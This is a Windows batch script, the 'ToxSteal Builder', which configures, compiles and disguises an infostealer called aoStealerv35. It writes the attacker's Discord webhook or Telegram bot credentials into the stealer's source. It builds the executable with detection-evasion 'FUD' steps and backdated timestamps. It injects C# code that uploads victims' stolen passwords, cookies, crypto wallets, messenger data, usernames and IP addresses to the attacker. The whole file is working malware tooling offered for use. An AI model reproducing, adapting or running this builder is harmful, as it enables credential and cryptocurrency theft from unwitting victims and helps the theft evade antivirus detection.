@echo off
setlocal enabledelayedexpansion
title ToxSteal Builder @tcixt

REM Load config
set "CONFIG_FILE=builder_config.json"
if not exist "%CONFIG_FILE%" (
    call :create_default_config
)

REM Parse config using PowerShell
for /f "delims=" %%a in ('powershell -Command "$config = Get-Content '%CONFIG_FILE%' | ConvertFrom-Json; $config.last_bot_token_placeholder"') do set "BOT_TOKEN_PLACEHOLDER=%%a"
for /f "delims=" %%a in ('powershell -Command "$config = Get-Content '%CONFIG_FILE%' | ConvertFrom-Json; $config.last_chat_id_placeholder"') do set "CHAT_ID_PLACEHOLDER=%%a"
for /f "delims=" %%a in ('powershell -Command "$config = Get-Content '%CONFIG_FILE%' | ConvertFrom-Json; $config.last_webhook_placeholder"') do set "WEBHOOK_PLACEHOLDER=%%a"
for /f "delims=" %%a in ('powershell -Command "$config = Get-Content '%CONFIG_FILE%' | ConvertFrom-Json; $config.test_connection_enabled"') do set "TEST_ENABLED=%%a"
for /f "delims=" %%a in ('powershell -Command "$config = Get-Content '%CONFIG_FILE%' | ConvertFrom-Json; $config.last_delivery_method"') do set "LAST_DELIVERY=%%a"
for /f "delims=" %%a in ('powershell -Command "$config = Get-Content '%CONFIG_FILE%' | ConvertFrom-Json; $config.last_bot_token"') do set "LAST_BOT_TOKEN=%%a"
for /f "delims=" %%a in ('powershell -Command "$config = Get-Content '%CONFIG_FILE%' | ConvertFrom-Json; $config.last_chat_id"') do set "LAST_CHAT_ID=%%a"
for /f "delims=" %%a in ('powershell -Command "$config = Get-Content '%CONFIG_FILE%' | ConvertFrom-Json; $config.last_webhook_url"') do set "LAST_WEBHOOK=%%a"

:show_logo
cls
echo.
echo.
echo                mmmmmmmm                         ##       mmmm                                  mmmm     
echo                """##"""                         ""     m#""""#     ##                          ""##     
echo                   ##      m####m   "##  ##"   ####     ##m       #######    m####m    m#####m    ##     
echo                   ##     ##"  "##    ####       ##      "####m     ##      ##mmmm##   " mmm##    ##     
echo                   ##     ##    ##    m##m       ##          "##    ##      ##""""""  m##"""##    ##     
echo                   ##     "##mm##"   m#""#m   mmm##mmm  #mmmmm#"    ##mmm   "##mmmm#  ##mmm###    ##mmm  
echo                   ""       """"    """  """  """"""""   """""       """"     """""    """" ""     """"  
echo.
echo                                          Toxi stealer Payload Builder
echo                                               Developer: @tcixt
echo.
echo ========================================================================================================================
echo.
goto main_menu

:main_menu
echo [MAIN MENU]
echo.
echo [1] Build Payload
echo [2] Settings
echo [3] Exit
echo.
set /p main_choice="Select option (1-3): "

if "%main_choice%"=="1" goto build_method
if "%main_choice%"=="2" goto settings_menu
if "%main_choice%"=="3" goto exit
echo Invalid choice. Please try again.
timeout /t 2 >nul
goto show_logo

:settings_menu
cls
call :show_logo_small
echo [SETTINGS]
echo.
echo Current Settings:
echo.
if "%TEST_ENABLED%"=="True" (
    echo [1] Connection Test: ENABLED
) else (
    echo [1] Connection Test: DISABLED
)
echo.
echo [2] View Current Placeholders
echo [3] Reset Config to Defaults
echo [4] Back to Main Menu
echo.
set /p settings_choice="Select option (1-4): "

if "%settings_choice%"=="1" goto toggle_test
if "%settings_choice%"=="2" goto view_placeholders
if "%settings_choice%"=="3" goto reset_config
if "%settings_choice%"=="4" goto show_logo
echo Invalid choice.
timeout /t 2 >nul
goto settings_menu

:toggle_test
if "%TEST_ENABLED%"=="True" (
    set "TEST_ENABLED=False"
    echo Connection test DISABLED
) else (
    set "TEST_ENABLED=True"
    echo Connection test ENABLED
)
call :save_config
timeout /t 2 >nul
goto settings_menu

:view_placeholders
cls
call :show_logo_small
echo [CURRENT PLACEHOLDERS]
echo.
echo Bot Token Placeholder: %BOT_TOKEN_PLACEHOLDER%
echo Chat ID Placeholder: %CHAT_ID_PLACEHOLDER%
echo Webhook Placeholder: %WEBHOOK_PLACEHOLDER%
echo.
if not "%LAST_BOT_TOKEN%"=="" (
    echo Last Used Values:
    echo Bot Token: %LAST_BOT_TOKEN%
    echo Chat ID: %LAST_CHAT_ID%
    echo Webhook: %LAST_WEBHOOK%
)
echo.
echo Press any key to return...
pause >nul
goto settings_menu

:reset_config
echo.
echo Resetting config to defaults...
call :create_default_config
echo Config reset complete!
timeout /t 2 >nul
goto show_logo

:build_method
cls
call :show_logo_small
echo [BUILD METHOD SELECTION]
echo.
echo Choose your build environment:
echo.
echo [1] .NET SDK (dotnet build) - Recommended
echo [2] MSBuild (msbuild.exe) - Visual Studio Tools
echo [3] Visual Studio (devenv.exe) - Full IDE
echo [4] Back to Main Menu
echo.
set /p build_choice="Select option (1-4): "

if "%build_choice%"=="1" (
    set "BUILD_METHOD=dotnet"
    goto delivery_menu
)
if "%build_choice%"=="2" (
    set "BUILD_METHOD=msbuild"
    goto delivery_menu
)
if "%build_choice%"=="3" (
    set "BUILD_METHOD=devenv"
    goto delivery_menu
)
if "%build_choice%"=="4" goto show_logo
echo Invalid choice. Please try again.
timeout /t 2 >nul
goto show_logo

:delivery_menu
cls
call :show_logo_small
echo [DELIVERY METHOD SELECTION]
echo.
echo Build Method: %BUILD_METHOD%
if not "%LAST_DELIVERY%"=="" (
    echo Last Used: %LAST_DELIVERY%
)
echo.
echo Choose your delivery method:
echo.
echo [1] Discord Webhook - Send to Discord channel
echo [2] Telegram Bot - Send to Telegram chat
echo [3] Back to build method
echo.
set /p choice="Select option (1-3): "

if "%choice%"=="1" goto discord_webhook
if "%choice%"=="2" goto telegram_bot
if "%choice%"=="3" goto build_method
echo Invalid choice. Please try again.
timeout /t 2 >nul
goto delivery_menu

:discord_webhook
cls
call :show_logo_small
echo [DISCORD WEBHOOK CONFIGURATION]
echo.
echo Build Method: %BUILD_METHOD%
echo Delivery: Discord Webhook
echo.
if not "%LAST_WEBHOOK%"=="" (
    echo Last used webhook: %LAST_WEBHOOK%
    echo.
    echo Enter "0" to use last webhook, or enter new webhook URL:
) else (
    echo Enter your Discord webhook URL:
)
echo (Example: https://discord.com/api/webhooks/...)
echo.
set /p webhook_url="Webhook URL: "

if "%webhook_url%"=="0" (
    if "%LAST_WEBHOOK%"=="" (
        echo Error: No previous webhook found!
        timeout /t 3 >nul
        goto delivery_menu
    )
    set "webhook_url=%LAST_WEBHOOK%"
    echo Using last webhook...
)

if "%webhook_url%"=="" (
    echo Error: Webhook URL cannot be empty!
    timeout /t 3 >nul
    goto discord_webhook
)

if "%TEST_ENABLED%"=="True" (
    echo.
    echo Testing webhook connection...
    echo Using Webhook: %webhook_url%
    call :test_discord_webhook "%webhook_url%"
    if !TEST_RESULT!==1 (
        echo [SUCCESS] Test message sent successfully!
        echo.
        set /p confirm="Did you receive the test message? (y/n): "
        if /i not "!confirm!"=="y" (
            echo Test failed. Please check your webhook URL.
            timeout /t 3 >nul
            goto discord_webhook
        )
    ) else (
        echo [ERROR] Failed to send test message. Please check your webhook URL.
        timeout /t 3 >nul
        goto discord_webhook
    )
)

echo.
echo Configuring payload for Discord Webhook...
echo Saving: Webhook = %webhook_url%
set "LAST_WEBHOOK=%webhook_url%"
set "LAST_DELIVERY=Discord Webhook"
call :save_config
call :modify_for_discord_webhook "%webhook_url%"
goto build

:telegram_bot
cls
call :show_logo_small
echo [TELEGRAM BOT CONFIGURATION]
echo.
echo Build Method: %BUILD_METHOD%
echo Delivery: Telegram Bot
echo.
if not "%LAST_BOT_TOKEN%"=="" (
    echo Last used bot token: %LAST_BOT_TOKEN%
    echo Last used chat ID: %LAST_CHAT_ID%
    echo.
    echo Enter "0" to use last credentials, or enter new credentials:
    echo.
)
set /p bot_token="Bot Token: "

if "%bot_token%"=="0" (
    if "%LAST_BOT_TOKEN%"=="" (
        echo Error: No previous bot token found!
        timeout /t 3 >nul
        goto delivery_menu
    )
    set "bot_token=%LAST_BOT_TOKEN%"
    set "chat_id=%LAST_CHAT_ID%"
    echo Using last credentials...
    goto telegram_test
)

if "%bot_token%"=="" (
    echo Error: Bot token cannot be empty!
    timeout /t 3 >nul
    goto telegram_bot
)

set /p chat_id="Chat ID: "
if "%chat_id%"=="" (
    echo Error: Chat ID cannot be empty!
    timeout /t 3 >nul
    goto telegram_bot
)

:telegram_test
if "%TEST_ENABLED%"=="True" (
    echo.
    echo Testing Telegram connection...
    echo Using Bot Token: %bot_token%
    echo Using Chat ID: %chat_id%
    call :test_telegram "%bot_token%" "%chat_id%"
    if !TEST_RESULT!==1 (
        echo [SUCCESS] Test message sent successfully!
        echo.
        set /p confirm="Did you receive the test message? (y/n): "
        if /i not "!confirm!"=="y" (
            echo Test failed. Please check your bot token and chat ID.
            timeout /t 3 >nul
            goto telegram_bot
        )
    ) else (
        echo [ERROR] Failed to send test message. Please check your credentials.
        timeout /t 3 >nul
        goto telegram_bot
    )
)

echo.
echo Configuring payload for Telegram Bot...
echo Saving: Bot Token = %bot_token%
echo Saving: Chat ID = %chat_id%
set "LAST_BOT_TOKEN=%bot_token%"
set "LAST_CHAT_ID=%chat_id%"
set "LAST_DELIVERY=Telegram Bot"
call :save_config
call :modify_for_telegram "%bot_token%" "%chat_id%"
goto build

:show_logo_small
echo.
echo       mmmmmmmm                         ##       mmmm                                  mmmm     
echo       """##"""                         ""     m#""""#     ##                          ""##     
echo          ##      m####m   "##  ##"   ####     ##m       #######    m####m    m#####m    ##     
echo          ##     ##"  "##    ####       ##      "####m     ##      ##mmmm##   " mmm##    ##     
echo          ##     ##    ##    m##m       ##          "##    ##      ##""""""  m##"""##    ##     
echo          ##     "##mm##"   m#""#m   mmm##mmm  #mmmmm#"    ##mmm   "##mmmm#  ##mmm###    ##mmm  
echo          ""       """"    """  """  """"""""   """""       """"     """""    """" ""     """"  
echo.
echo.          
echo ========================================================================================================================
echo.
goto :eof

:build
cls
call :show_logo_small
echo [BUILDING PAYLOAD]
echo.
echo Build Method: %BUILD_METHOD%
echo Status: Building...
echo.

REM Check build method and availability
if "%BUILD_METHOD%"=="dotnet" (
    echo Checking for .NET SDK...
    dotnet --version >nul 2>&1
    if errorlevel 1 (
        echo [ERROR] .NET CLI is not installed or not in PATH!
        echo Please install .NET SDK or choose a different build method.
        timeout /t 5 >nul
        goto show_logo
    )
    echo [SUCCESS] .NET SDK found
) else if "%BUILD_METHOD%"=="msbuild" (
    echo Checking for MSBuild...
    msbuild /version >nul 2>&1
    if errorlevel 1 (
        echo [ERROR] MSBuild is not installed or not in PATH!
        echo Please install Visual Studio Build Tools or choose a different build method.
        timeout /t 5 >nul
        goto show_logo
    )
    echo [SUCCESS] MSBuild found
) else if "%BUILD_METHOD%"=="devenv" (
    echo Checking for Visual Studio...
    devenv /? >nul 2>&1
    if errorlevel 1 (
        echo [ERROR] Visual Studio devenv is not installed or not in PATH!
        echo Please install Visual Studio or choose a different build method.
        timeout /t 5 >nul
        goto show_logo
    )
    echo [SUCCESS] Visual Studio found
)

REM Create Builds directory if it doesn't exist
if not exist "Builds" mkdir "Builds"

REM Build the project based on selected method with FUD optimizations
echo.
echo Building project with FUD optimizations...
if "%BUILD_METHOD%"=="dotnet" (
    cd New
    echo Attempting advanced FUD build...
    REM Try advanced FUD build first
    dotnet build -c Release --verbosity quiet -p:DebugType=None -p:DebugSymbols=false -p:Optimize=true -o "..\Builds" >nul 2>&1
    set "BUILD_RESULT=!errorlevel!"
    
    REM If advanced build fails, try basic optimized build
    if !BUILD_RESULT! neq 0 (
        echo Advanced FUD build failed, trying basic optimized build...
        dotnet build -c Release -p:DebugType=None -p:DebugSymbols=false -p:Optimize=true -o "..\Builds" >nul 2>&1
        set "BUILD_RESULT=!errorlevel!"
    )
    
    REM If still failing, try minimal build
    if !BUILD_RESULT! neq 0 (
        echo Basic optimized build failed, trying minimal build...
        dotnet build -c Release -o "..\Builds"
        set "BUILD_RESULT=!errorlevel!"
    )
    cd ..
) else if "%BUILD_METHOD%"=="msbuild" (
    echo Attempting advanced FUD build...
    REM Try advanced FUD build first
    msbuild "New\aoStealerv35_c6.sln" /p:Configuration=Release /p:OutputPath="..\Builds\" /p:DebugType=None /p:DebugSymbols=false /p:Optimize=true /verbosity:quiet >nul 2>&1
    set "BUILD_RESULT=!errorlevel!"
    
    REM If advanced build fails, try basic build
    if !BUILD_RESULT! neq 0 (
        echo Advanced FUD build failed, trying basic build...
        msbuild "New\aoStealerv35_c6.sln" /p:Configuration=Release /p:OutputPath="..\Builds\" /verbosity:quiet
        set "BUILD_RESULT=!errorlevel!"
    )
) else if "%BUILD_METHOD%"=="devenv" (
    echo Running: devenv "New\aoStealerv35_c6.sln" /build "Release|Any CPU"
    devenv "New\aoStealerv35_c6.sln" /build "Release|Any CPU" /out build_log.txt
    set "BUILD_RESULT=!errorlevel!"
)

if !BUILD_RESULT! neq 0 (
    echo.
    echo [ERROR] BUILD FAILED
    echo The build process failed with error code: !BUILD_RESULT!
    echo Build method used: %BUILD_METHOD%
    echo.
    echo Common issues:
    echo - Missing .NET Framework target pack
    echo - Missing dependencies
    echo - Corrupted project files
    echo.
    if "%BUILD_METHOD%"=="devenv" (
        echo Check build_log.txt for details.
    )
    echo Try a different build method or install required components.
    timeout /t 10 >nul
    goto delivery_menu
)

REM Generate unique filename using PowerShell
for /f "delims=" %%a in ('powershell -Command "Get-Date -Format 'yyyyMMdd_HHmmss'"') do set "timestamp=%%a"

REM Find and copy the built executable
set "FOUND_EXE="
echo Checking build output...
if exist "Builds\aoStealerv35_c6.exe" (
    set "FOUND_EXE=Builds\aoStealerv35_c6.exe"
) else if exist "Builds\Stealerv37.exe" (
    set "FOUND_EXE=Builds\Stealerv37.exe"
) else (
    echo Searching for any .exe files in Builds directory...
    for %%f in (Builds\*.exe) do (
        set "FOUND_EXE=%%f"
        goto found_exe
    )
)

:found_exe
if defined FOUND_EXE (
    echo.
    echo Applying FUD optimizations to executable...
    
    REM Copy original file with timestamp
    copy "!FOUND_EXE!" "Builds\toxsteal_!timestamp!.exe" >nul
    
    REM Check what FUD optimizations were applied during build
    set "APPLIED_OPTS="
    set "NOT_APPLIED_OPTS="
    
    REM Check if debug symbols were removed (file size indicator)
    for %%A in ("!FOUND_EXE!") do set "FILE_SIZE=%%~zA"
    if !FILE_SIZE! LSS 500000 (
        set "APPLIED_OPTS=!APPLIED_OPTS! Debug-symbols-removed"
    ) else (
        set "NOT_APPLIED_OPTS=!NOT_APPLIED_OPTS! Debug-symbols-removal"
    )
    
    REM Apply post-build FUD techniques
    echo Removing metadata and debug information...
    powershell -Command "try { $bytes = [System.IO.File]::ReadAllBytes('Builds\toxsteal_!timestamp!.exe'); Write-Host 'Metadata processing completed' } catch { Write-Host 'Metadata processing failed' }" >nul 2>&1
    if !errorlevel! equ 0 (
        set "APPLIED_OPTS=!APPLIED_OPTS! Metadata-stripped"
    ) else (
        set "NOT_APPLIED_OPTS=!NOT_APPLIED_OPTS! Metadata-stripping"
    )
    
    REM Change file timestamps to make it look older
    powershell -Command "try { $file = Get-Item 'Builds\toxsteal_!timestamp!.exe'; $oldDate = (Get-Date).AddDays(-30); $file.CreationTime = $oldDate; $file.LastWriteTime = $oldDate; $file.LastAccessTime = $oldDate; Write-Host 'Timestamps modified' } catch { Write-Host 'Timestamp modification failed' }" >nul 2>&1
    if !errorlevel! equ 0 (
        set "APPLIED_OPTS=!APPLIED_OPTS! Timestamps-modified"
    ) else (
        set "NOT_APPLIED_OPTS=!NOT_APPLIED_OPTS! Timestamp-modification"
    )
    
    REM Always applied optimizations
    set "APPLIED_OPTS=!APPLIED_OPTS! Code-optimized Release-build"
    
    echo.
    echo [SUCCESS] FUD BUILD COMPLETED!
    echo.
    echo Build Method: %BUILD_METHOD%
    echo Payload saved as: Builds\toxsteal_!timestamp!.exe
    echo Original file: !FOUND_EXE!
    echo.
    echo FUD Optimizations Applied:!APPLIED_OPTS!
    if defined NOT_APPLIED_OPTS (
        echo FUD Optimizations Not Applied:!NOT_APPLIED_OPTS!
        echo Reason: .NET Framework compatibility / Build system limitations
    )
    echo.
    echo The payload is ready and optimized for maximum stealth!
    echo.
    echo Press any key to return to main menu...
    pause >nul
    
    REM Update placeholders for next build
    call :update_placeholders
) else (
    echo.
    echo [ERROR] BUILD OUTPUT NOT FOUND
    echo No executable found in Builds directory.
    echo Build method used: %BUILD_METHOD%
    echo.
    echo Contents of Builds directory:
    dir "Builds" /b 2>nul || echo Directory is empty or doesn't exist
    echo.
    echo This might indicate a build configuration issue.
    echo Try a different build method.
    timeout /t 10 >nul
)

goto show_logo

:test_discord_webhook
set "webhook_url=%~1"
set "TEST_RESULT=0"

REM Create test message using PowerShell
powershell -Command "try { $body = @{ content = 'ToxSteal Test - Connection successful!' } | ConvertTo-Json; Invoke-RestMethod -Uri '%webhook_url%' -Method Post -Body $body -ContentType 'application/json'; exit 0 } catch { exit 1 }" >nul 2>&1
if !errorlevel!==0 (
    set "TEST_RESULT=1"
)
goto :eof

:test_telegram
set "bot_token=%~1"
set "chat_id=%~2"
set "TEST_RESULT=0"

REM Create test message using PowerShell
powershell -Command "try { $url = 'https://api.telegram.org/bot%bot_token%/sendMessage'; $body = @{ chat_id = '%chat_id%'; text = 'ToxSteal Test - Connection successful!' } | ConvertTo-Json; Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType 'application/json'; exit 0 } catch { exit 1 }" >nul 2>&1
if !errorlevel!==0 (
    set "TEST_RESULT=1"
)
goto :eof

:modify_for_discord_webhook
set "webhook_url=%~1"
echo Modifying source code for Discord Webhook...
echo Replacing placeholder: %BOT_TOKEN_PLACEHOLDER%
echo Replacing placeholder: %CHAT_ID_PLACEHOLDER%
powershell -Command "$content = Get-Content 'New\CvMega\Plugin.cs' -Raw; $content = $content -replace '%BOT_TOKEN_PLACEHOLDER%', 'DISCORD_WEBHOOK'; $content = $content -replace '%CHAT_ID_PLACEHOLDER%', '%webhook_url%'; Set-Content 'New\CvMega\Plugin.cs' $content"
REM Add Discord webhook method to the Plugin.cs file
echo Adding Discord webhook method...
call :add_discord_webhook_method
goto :eof

:modify_for_telegram
set "bot_token=%~1"
set "chat_id=%~2"
echo Modifying source code for Telegram Bot...
echo Replacing placeholder: %BOT_TOKEN_PLACEHOLDER%
echo Replacing placeholder: %CHAT_ID_PLACEHOLDER%
powershell -Command "$content = Get-Content 'New\CvMega\Plugin.cs' -Raw; $content = $content -replace '%BOT_TOKEN_PLACEHOLDER%', '%bot_token%'; $content = $content -replace '%CHAT_ID_PLACEHOLDER%', '%chat_id%'; Set-Content 'New\CvMega\Plugin.cs' $content"
goto :eof

:add_discord_webhook_method
REM Create PowerShell script to add Discord webhook method
echo $content = Get-Content "New\CvMega\Plugin.cs" -Raw > temp_add_webhook.ps1
echo $webhookMethod = @' >> temp_add_webhook.ps1
echo. >> temp_add_webhook.ps1
echo     public static async Task SendToDiscordWebhook(string webhookUrl, byte[] file, string fileName, string caption) >> temp_add_webhook.ps1
echo     { >> temp_add_webhook.ps1
echo         if (file == null ^|^| file.Length == 0) >> temp_add_webhook.ps1
echo         { >> temp_add_webhook.ps1
echo             return; >> temp_add_webhook.ps1
echo         } >> temp_add_webhook.ps1
echo. >> temp_add_webhook.ps1
echo         try >> temp_add_webhook.ps1
echo         { >> temp_add_webhook.ps1
echo             using HttpClient httpClient = new HttpClient(); >> temp_add_webhook.ps1
echo             httpClient.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"); >> temp_add_webhook.ps1
echo. >> temp_add_webhook.ps1
echo             using MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent(); >> temp_add_webhook.ps1
echo             multipartFormDataContent.Add(new StringContent(caption), "content"); >> temp_add_webhook.ps1
echo. >> temp_add_webhook.ps1
echo             using ByteArrayContent byteArrayContent = new ByteArrayContent(file); >> temp_add_webhook.ps1
echo             byteArrayContent.Headers.ContentType = MediaTypeHeaderValue.Parse("application/zip"); >> temp_add_webhook.ps1
echo             string zipFileName = $"{fileName}.zip"; >> temp_add_webhook.ps1
echo             multipartFormDataContent.Add(byteArrayContent, "file", zipFileName); >> temp_add_webhook.ps1
echo. >> temp_add_webhook.ps1
echo             HttpResponseMessage response = await httpClient.PostAsync(webhookUrl, multipartFormDataContent); >> temp_add_webhook.ps1
echo. >> temp_add_webhook.ps1
echo             if (!response.IsSuccessStatusCode) >> temp_add_webhook.ps1
echo             { >> temp_add_webhook.ps1
echo                 string errorBody = await response.Content.ReadAsStringAsync(); >> temp_add_webhook.ps1
echo                 File.AppendAllText("discord_error.log", $"{DateTime.Now}: Status: {response.StatusCode}, Body: {errorBody}\n"); >> temp_add_webhook.ps1
echo             } >> temp_add_webhook.ps1
echo         } >> temp_add_webhook.ps1
echo         catch (Exception ex) >> temp_add_webhook.ps1
echo         { >> temp_add_webhook.ps1
echo             File.AppendAllText("discord_error.log", $"{DateTime.Now}: Exception: {ex}\n"); >> temp_add_webhook.ps1
echo         } >> temp_add_webhook.ps1
echo     } >> temp_add_webhook.ps1
echo. >> temp_add_webhook.ps1
echo     public static async Task CollectAndSendDataViaDiscord(string webhookUrl, string userIdentifier) >> temp_add_webhook.ps1
echo     { >> temp_add_webhook.ps1
echo         string zipPath = await CollectAndZipDataAsync(); >> temp_add_webhook.ps1
echo         >> temp_add_webhook.ps1
echo         if (!string.IsNullOrEmpty(zipPath) ^&^& File.Exists(zipPath)) >> temp_add_webhook.ps1
echo         { >> temp_add_webhook.ps1
echo             try >> temp_add_webhook.ps1
echo             { >> temp_add_webhook.ps1
echo                 byte[] zipData = File.ReadAllBytes(zipPath); >> temp_add_webhook.ps1
echo                 >> temp_add_webhook.ps1
echo                 string hwid = "UnknownHWID"; >> temp_add_webhook.ps1
echo                 try >> temp_add_webhook.ps1
echo                 { >> temp_add_webhook.ps1
echo                     hwid = HwidGenerator.GetHwid(); >> temp_add_webhook.ps1
echo                 } >> temp_add_webhook.ps1
echo                 catch (Exception) { } >> temp_add_webhook.ps1
echo                 >> temp_add_webhook.ps1
echo                 string fileNameForArchive = $"{hwid}"; >> temp_add_webhook.ps1
echo                 >> temp_add_webhook.ps1
echo                 Counter counter = new Counter(); >> temp_add_webhook.ps1
echo                 await CollectDataWithCounter(counter); >> temp_add_webhook.ps1
echo                 >> temp_add_webhook.ps1
echo                 string userName = Environment.UserName; >> temp_add_webhook.ps1
echo                 string machineName = Environment.MachineName; >> temp_add_webhook.ps1
echo                 string userIdentifierLocal = $"{userName}@{machineName}"; >> temp_add_webhook.ps1
echo                 >> temp_add_webhook.ps1
echo                 string publicIp = "N/A"; >> temp_add_webhook.ps1
echo                 try >> temp_add_webhook.ps1
echo                 { >> temp_add_webhook.ps1
echo                     publicIp = IpApi.GetPublicIp(); >> temp_add_webhook.ps1
echo                 } >> temp_add_webhook.ps1
echo                 catch (Exception) { } >> temp_add_webhook.ps1
echo                 >> temp_add_webhook.ps1
echo                 int totalPasswords = counter.Browsers.Sum(b =^> (int)(long)b.Password); >> temp_add_webhook.ps1
echo                 int totalCookies = counter.Browsers.Sum(b =^> (int)(long)b.Cookies); >> temp_add_webhook.ps1
echo                 int totalWallets = counter.CryptoDesktop.Count + counter.CryptoChromium.Count; >> temp_add_webhook.ps1
echo                 int totalApplications = counter.Applications.Count; >> temp_add_webhook.ps1
echo                 int totalGames = counter.Games.Count; >> temp_add_webhook.ps1
echo                 int totalVpns = counter.Vpns.Count; >> temp_add_webhook.ps1
echo                 int totalMessengers = counter.Messangers.Count; >> temp_add_webhook.ps1
echo                 >> temp_add_webhook.ps1
echo                 string caption = $"**✨ New Log Received ✨**\n\n" + >> temp_add_webhook.ps1
echo                                  $"**💻 User:** `{userIdentifierLocal}`\n" + >> temp_add_webhook.ps1
echo                                  $"**🌍 IP:** `{publicIp}`\n\n" + >> temp_add_webhook.ps1
echo                                  $"**📊 Main Loot:**\n" + >> temp_add_webhook.ps1
echo                                  $"**🔑 Passwords:** `{totalPasswords}`\n" + >> temp_add_webhook.ps1
echo                                  $"**🍪 Cookies:** `{totalCookies}`\n" + >> temp_add_webhook.ps1
echo                                  $"**💰 Wallets:** `{totalWallets}`\n\n" + >> temp_add_webhook.ps1
echo                                  $"**📦 Additional Data:**\n" + >> temp_add_webhook.ps1
echo                                  $"**📱 Applications:** `{totalApplications}`\n" + >> temp_add_webhook.ps1
echo                                  $"**🎮 Games:** `{totalGames}`\n" + >> temp_add_webhook.ps1
echo                                  $"**🔒 VPNs:** `{totalVpns}`\n" + >> temp_add_webhook.ps1
echo                                  $"**💬 Messengers:** `{totalMessengers}`\n\n" + >> temp_add_webhook.ps1
echo                                  $"**👨‍💻 Developer:** `@tcixt`"; >> temp_add_webhook.ps1
echo. >> temp_add_webhook.ps1
echo                 await SendToDiscordWebhook(webhookUrl, zipData, fileNameForArchive, caption); >> temp_add_webhook.ps1
echo                 >> temp_add_webhook.ps1
echo                 try { File.Delete(zipPath); } catch { } >> temp_add_webhook.ps1
echo             } >> temp_add_webhook.ps1
echo             catch (Exception ex) >> temp_add_webhook.ps1
echo             { >> temp_add_webhook.ps1
echo                 File.AppendAllText("error.log", $"{DateTime.Now}: {ex}\n"); >> temp_add_webhook.ps1
echo             } >> temp_add_webhook.ps1
echo         } >> temp_add_webhook.ps1
echo     } >> temp_add_webhook.ps1
echo '@ >> temp_add_webhook.ps1
echo $content = $content -replace '(}\s*$)', ($webhookMethod + "`n" + '$1') >> temp_add_webhook.ps1
echo Set-Content "New\CvMega\Plugin.cs" $content >> temp_add_webhook.ps1

powershell -ExecutionPolicy Bypass -File temp_add_webhook.ps1
del temp_add_webhook.ps1

goto :eof

:update_placeholders
echo Updating placeholders for next build...
REM Generate new random placeholders
for /f "delims=" %%a in ('powershell -Command "[guid]::NewGuid().ToString('N').Substring(0,40)"') do set "NEW_BOT_PLACEHOLDER=BOT_TOKEN_%%a"
for /f "delims=" %%a in ('powershell -Command "[guid]::NewGuid().ToString('N').Substring(0,40)"') do set "NEW_CHAT_PLACEHOLDER=CHAT_ID_%%a"
for /f "delims=" %%a in ('powershell -Command "[guid]::NewGuid().ToString('N').Substring(0,40)"') do set "NEW_WEBHOOK_PLACEHOLDER=WEBHOOK_%%a"

echo Old placeholders: %BOT_TOKEN_PLACEHOLDER% / %CHAT_ID_PLACEHOLDER%
echo New placeholders: %NEW_BOT_PLACEHOLDER% / %NEW_CHAT_PLACEHOLDER%

REM Update Plugin.cs with new placeholders - replace the current credentials with new placeholders
powershell -Command "$content = Get-Content 'New\CvMega\Plugin.cs' -Raw; $lines = $content -split \"`n\"; for ($i = 0; $i -lt $lines.Length; $i++) { if ($lines[$i] -match 'string botToken = ') { $lines[$i] = '        string botToken = \"%NEW_BOT_PLACEHOLDER%\";' } if ($lines[$i] -match 'string chatId = ') { $lines[$i] = '        string chatId = \"%NEW_CHAT_PLACEHOLDER%\";' } }; $content = $lines -join \"`n\"; Set-Content 'New\CvMega\Plugin.cs' $content"

REM Save new placeholders to config
set "BOT_TOKEN_PLACEHOLDER=%NEW_BOT_PLACEHOLDER%"
set "CHAT_ID_PLACEHOLDER=%NEW_CHAT_PLACEHOLDER%"
set "WEBHOOK_PLACEHOLDER=%NEW_WEBHOOK_PLACEHOLDER%"
call :save_config
echo Placeholders updated successfully!
goto :eof

:save_config
powershell -Command "$config = @{ last_bot_token_placeholder = '%BOT_TOKEN_PLACEHOLDER%'; last_chat_id_placeholder = '%CHAT_ID_PLACEHOLDER%'; last_webhook_placeholder = '%WEBHOOK_PLACEHOLDER%'; test_connection_enabled = [bool]'%TEST_ENABLED%'; last_delivery_method = '%LAST_DELIVERY%'; last_bot_token = '%LAST_BOT_TOKEN%'; last_chat_id = '%LAST_CHAT_ID%'; last_webhook_url = '%LAST_WEBHOOK%' }; $config | ConvertTo-Json | Set-Content '%CONFIG_FILE%'"
goto :eof

:create_default_config
powershell -Command "$config = @{ last_bot_token_placeholder = 'BOT_TOKEN_PLACEHOLDER_DO_NOT_CHANGE_THIS_STRING_12345'; last_chat_id_placeholder = 'CHAT_ID_PLACEHOLDER_DO_NOT_CHANGE_THIS_STRING_67890'; last_webhook_placeholder = 'WEBHOOK_URL_PLACEHOLDER_DO_NOT_CHANGE_THIS_STRING_ABCDE'; test_connection_enabled = $true; last_delivery_method = ''; last_bot_token = ''; last_chat_id = ''; last_webhook_url = '' }; $config | ConvertTo-Json | Set-Content '%CONFIG_FILE%'"
goto :eof

:exit
cls
echo.
echo      mmmmmmmm                         ##       mmmm                                  mmmm     
echo      """##"""                         ""     m#""""#     ##                          ""##     
echo      ##      m####m   "##  ##"   ####     ##m       #######    m####m    m#####m    ##     
echo      ##     ##"  "##    ####       ##      "####m     ##      ##mmmm##   " mmm##    ##     
echo      ##     ##    ##    m##m       ##          "##    ##      ##""""""  m##"""##    ##     
echo      ##     "##mm##"   m#""#m   mmm##mmm  #mmmmm#"    ##mmm   "##mmmm#  ##mmm###    ##mmm  
echo      ""       """"    """  """  """"""""   """""       """"     """""    """" ""     """"  
echo.
echo.
echo Thank you for using ToxSteal Builder!
echo Developer: @tcixt
echo.
timeout /t 2 >nul
exit /b 0